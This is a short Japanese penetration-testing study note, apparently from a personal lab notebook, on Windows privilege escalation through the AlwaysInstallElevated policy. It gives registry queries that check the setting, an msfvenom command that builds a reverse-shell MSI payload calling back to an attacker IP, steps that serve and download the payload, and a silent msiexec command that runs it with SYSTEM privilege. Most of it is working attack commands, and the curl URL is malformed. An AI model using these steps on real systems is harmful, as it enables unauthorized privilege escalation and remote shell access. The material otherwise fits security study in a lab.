## AlwaysInstallElevated

windowsインストーラー(msi)を実行すると、常にシステム特権でインストールを行う

* AlqaysInstallElevatedの設定を確認する

  ```
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```

  ![image-20220831124548999](../../../TIL/TIL/Penetration/img/image-20220831124548999.png)

  ```
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```

  ![image-20220831124631325](../../../TIL/TIL/Penetration/img/image-20220831124631325.png)

* kaliでmsfvenomでpayload作成してあげてwin10vmに配送

  ```
  msfvenom -f msi -p windows/x64/shell_reverse_tcp LHOST=192.168.22.139 LPORT=12345 > evil.msi
  ```

  ```
  python -m http.server 8000
  ```

  ```
  curl -O http:192.168.22.139:8000/evil.msi /tmp/evil.msi
  ```

* msiを実行

  ```
  msiexec /quiet /qn /i <ファイル名>
  ```

  * msiexec：インストーラー(msi)を実行するツール（Windows 標準搭載)

  * /quiet：進行状況バーのみ表示

  * /qn：何も表示しない

  * /i：インストーラーの指定